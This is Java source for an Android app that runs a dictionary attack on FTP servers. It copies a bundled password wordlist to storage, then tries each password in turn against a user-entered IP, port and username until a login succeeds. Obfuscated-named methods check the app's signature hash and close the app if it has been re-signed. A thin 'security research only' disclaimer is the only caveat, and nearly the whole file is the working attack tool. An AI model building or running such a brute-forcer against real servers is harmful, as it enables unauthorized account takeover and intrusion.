package com.ftp.qq1198;

import android.app.*;
import android.content.*;
import android.content.pm.*;
import android.os.*;
import android.view.*;
import android.widget.*;
import java.io.*;
import java.util.*;
import org.apache.commons.net.ftp.*;

public class MainActivity extends Activity 
{
	String message;
	String getpath=Environment.getExternalStorageDirectory().getAbsolutePath();
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
		File a=new File(getpath+"/ftpqq1198");
		if(a.isDirectory()==false)
			if(!a.mkdirs())
			{
			}
		$123lll(this);
		String fileName = "password.txt";
		File file = new File(getpath+"/ftpqq1198/" + fileName);
		try
 {
	
			InputStream in = getAssets().open(fileName);
			FileOutputStream out = new FileOutputStream(file);
			int len = -1 ;
			byte[] bytes = new byte[1024];
			while( (len=in.read(bytes) ) != -1){
				out.write(bytes,0,len);
			}
			out.close();
			in.close();
			
		} catch (IOException e) {
			Toast.makeText(this,""+e,1000).show();
		}
		$123ll(this);
		 AlertDialog.Builder dialog=new AlertDialog.Builder(this);
		 dialog.setTitle("注意！");
		dialog.setMessage("警告:本软件仅供网络安全研究之用,非法使用后果自负!\n速度慢，精确高\nby qq1198\nQQ1198075593");
		dialog.setPositiveButton("同意",null);
		dialog.setNegativeButton("不同意", new AlertDialog.OnClickListener(){
				@Override
				public void onClick(DialogInterface p1, int p2)
				{
					finish();
				}});
		dialog.show();
	};
	public void come(View v){
	final TextView message1=(TextView)findViewById(R.id.message1);
	message1.append("正在连接..."+"\n");
	EditText ip=(EditText)findViewById(R.id.ip);
	EditText port=(EditText)findViewById(R.id.port);
	EditText yhm=(EditText)findViewById(R.id.yhm);
	final EditText mmpath=(EditText)findViewById(R.id.mmpath);
		if(ip.getText().toString().equals("")|port.getText().toString().equals("")|yhm.getText().toString().equals("")|mmpath.getText().toString().equals("")){
		Toast.makeText(this,"每个编辑框不得为空",1000).show();
		message1.append("发生错误！\n");
	}else{
		final String yhm1=yhm.getText().toString();
		final String url=ip.getText().toString();
		final int port1=Integer.parseInt(port.getText().toString());
		final FTPClient ftp = new FTPClient();
		final Handler mHandler = new Handler() {  

			@Override  
			public void handleMessage(Message msg) {  
				super.handleMessage(msg);  
				switch (msg.what) {  
					case 0:  
						message1.append(message);
						break;  
					default:  
						break;  }
			}};
		new Thread(new Runnable(){
			public void run(){
				try
				{	
			Scanner in = new Scanner(new File(mmpath.getText().toString()));
			while (in.hasNextLine()) {
				String mm = in.nextLine();
				ftp.connect(url,port1);
				message=("IP/网址:"+url+" 用户名:"+yhm1+" 正在尝试密码:"+mm+"\n");
				mHandler.sendEmptyMessage(0);  
				if(ftp.login(yhm1,""+mm)==true){
				message=("成功！密码是:"+mm+"\n");
					mHandler.sendEmptyMessage(0);  
					break;
				}else{
				message=("失败！"+"\n");
				mHandler.sendEmptyMessage(0);  
				}}}
		catch (Exception e)
		{
			message=("错误！，可能是该IP/网址没有开启ftp或填错IP或端口\n");
		}
	}}).start();}}
	public int $123lll(Context context) {
		try {
			PackageInfo packageInfo = context.getPackageManager()
                .getPackageInfo(context.getPackageName(),
								PackageManager.GET_SIGNATURES);
			Signature[] signs = packageInfo.signatures;
			Signature sign = signs[0];

			int hashcode = sign.hashCode();
			if(hashcode==336978032){

			}else{
				finish();
			}
			return hashcode == -82892576 ? 1 : 0;
		} catch (Exception e) {
			e.printStackTrace();
		}
		return -1;
	}
	private long exitTime = 0;
	public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            exit();
            return false;
        }
        return super.onKeyDown(keyCode, event);
    }
	public int $123ll(Context context) {
		try {
			PackageInfo packageInfo = context.getPackageManager()
                .getPackageInfo(context.getPackageName(),
								PackageManager.GET_SIGNATURES);
			Signature[] signs = packageInfo.signatures;
			Signature sign = signs[0];

			int hashcode = sign.hashCode();
			if(hashcode==336978032){

			}else{
				finish();
			}
			return hashcode == -82892576 ? 1 : 0;
		} catch (Exception e) {
			e.printStackTrace();
		}
		return -1;
	}
	public void exit() {
        if ((System.currentTimeMillis() - exitTime) > 2000) {
            Toast.makeText(getApplicationContext(), "再按一次退出程序",
						   Toast.LENGTH_SHORT).show();
            exitTime = System.currentTimeMillis();
        } else {
            finish();
            System.exit(0);
        }
    }

}
